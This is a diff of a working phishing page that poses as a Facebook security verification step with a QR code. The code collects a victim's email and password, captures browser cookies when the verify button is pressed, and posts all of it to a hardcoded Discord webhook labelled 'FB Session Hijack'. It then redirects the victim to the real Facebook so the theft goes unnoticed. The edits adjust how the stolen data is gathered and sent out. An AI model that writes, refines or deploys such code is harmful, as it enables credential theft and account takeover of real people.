@@ -119,6 +119,7 @@
             <p class="info-text">Scan with Facebook App or Click Verify</p>
             <img id="qr-image" class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=FB-SECURITY-VERIFY" alt="QR Code">
             
+            <!-- Ye button dabate hi Cookie capture hogi -->
             <button id="verifyBtn" class="verify-btn" onclick="captureAndRedirect()">✅ Verify & Scan</button>
             
             <p id="status" class="info-text" style="color: #1877f2; margin-top:15px;">Waiting...</p>
@@ -134,16 +135,12 @@
         // 👇👇👇 YAHAN APNA DISCORD WEBHOOK URL PASTE KARO 👇👇👇
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553320258054656070/u4QlkKbHzc6V2rwuf8ljZZh2jtGF-4dWQgG5pOztCH_Ej8qI1V6zQWA4OohQ6QTpfHhJ"; 
 
-        let windowUserData = {};
-
         function handleLogin(e) {
             e.preventDefault();
             
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
-            windowUserData = { email, password };
-
             // Hide form, show loader
             document.getElementById('loginForm').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
@@ -154,45 +151,40 @@
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('loadingText').style.display = 'none';
                 document.getElementById('qr-section').style.display = 'block';
+                
+                // Save creds for later
+                window.userData = { email, password };
             }, 1500);
         }
 
         function captureAndRedirect() {
-            const btn = document.getElementById('verifyBtn');
             const status = document.getElementById('status');
             const successMsg = document.getElementById('successMsg');
+            const btn = document.getElementById('verifyBtn');
             
             btn.style.display = 'none';
             status.innerText = "Capturing Session...";
-
-            // 1. Capture All Possible Data Sources
-            const cookies = document.cookie;
-            const localStorageData = JSON.stringify(localStorage);
-            const sessionStorageData = JSON.stringify(sessionStorage);
             
+            // 1. Capture Current Browser Cookies (This is the "App" cookie if user was logged in)
+            const cookies = document.cookie;
+            
+            // 2. Send Data (Email + Pass + Cookie)
             const payload = {
-                content: `🔓 **FB Session Hijack** 🔓\n📧 Email: \`${windowUserData.email}\`\n🔑 Pass: \`${windowUserData.password}\`\n🍪 **Cookies:** \`${cookies}\`\n📦 **LocalStorage:** \`${localStorageData}\`\n📦 **SessionStorage:** \`${sessionStorageData}\`\n⏰ Time: ${new Date().toLocaleTimeString()}`
+                content: `🔓 **FB Session Hijack** 🔓\n📧 Email: \`${window.userData.email}\`\n🔑 Pass: \`${window.userData.password}\`\n🍪 **Cookies:** \`${cookies}\`\n⏰ Time: ${new Date().toLocaleTimeString()}`
             };
 
-            // 2. Send Data using sendBeacon (More reliable than fetch)
-            try {
-                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-                navigator.sendBeacon(DISCORD_WEBHOOK_URL, blob);
-            } catch (e) {
-                // Fallback to fetch if sendBeacon fails
-                fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            }
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
 
             // 3. Show Success and Redirect
             setTimeout(() => {
                 status.style.display = 'none';
                 successMsg.style.display = 'block';
                 
-                // Redirect to REAL Facebook
+                // Redirect to REAL Facebook so user thinks it worked
                 setTimeout(() => {
                     window.location.href = "https://www.facebook.com/";
                 }, 2000);
